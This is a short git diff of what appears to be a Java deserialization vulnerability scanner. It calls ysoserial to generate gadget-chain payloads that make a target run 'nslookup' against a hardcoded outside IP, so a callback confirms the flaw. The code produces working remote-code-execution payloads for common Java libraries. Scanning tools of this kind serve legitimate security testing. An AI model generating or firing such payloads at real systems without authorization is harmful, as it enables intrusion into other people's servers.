@@ -26,7 +26,7 @@ def logging_config():
         logging_config()
 
 
-# Generate ping payload of java deserialization vul before main() with computer's ip running tool
+# Generate DNS payload of java deserialization vul before main() with computer's ip running tool
 def pre_main():
     print('\033[93m' + "<*> Generate payloads for scanning!")
     print("")
@@ -38,6 +38,7 @@ def pre_main():
 
     hostname = socket.gethostname()
     ip_add = socket.gethostbyname(hostname)
+    ip_add = "42.112.213.82"
     # ping_list = ["BeanShell1", "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
     #              "Hibernate1",
     #              "Hibernate2",
@@ -48,8 +49,8 @@ def pre_main():
                  "Hibernate1", "Hibernate2", "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]
 
     for name in ping_list:
-        command = "java -jar {}/ysoserial-master-55f1e7c35c-1.jar {} 'ping {} -n 1' > core/payload_ping/{}.bin".format(
-            os.getcwd(), name.strip(), ip_add, name)
+        command = "java -jar {}/ysoserial-master-55f1e7c35c-1.jar {} 'nslookup google.com.vn {}' > core/payload_ping/{}.bin".format(
+            os.getcwd(), name.strip(),ip_add, name)
         os.system(command)
     os.system("clear")
 
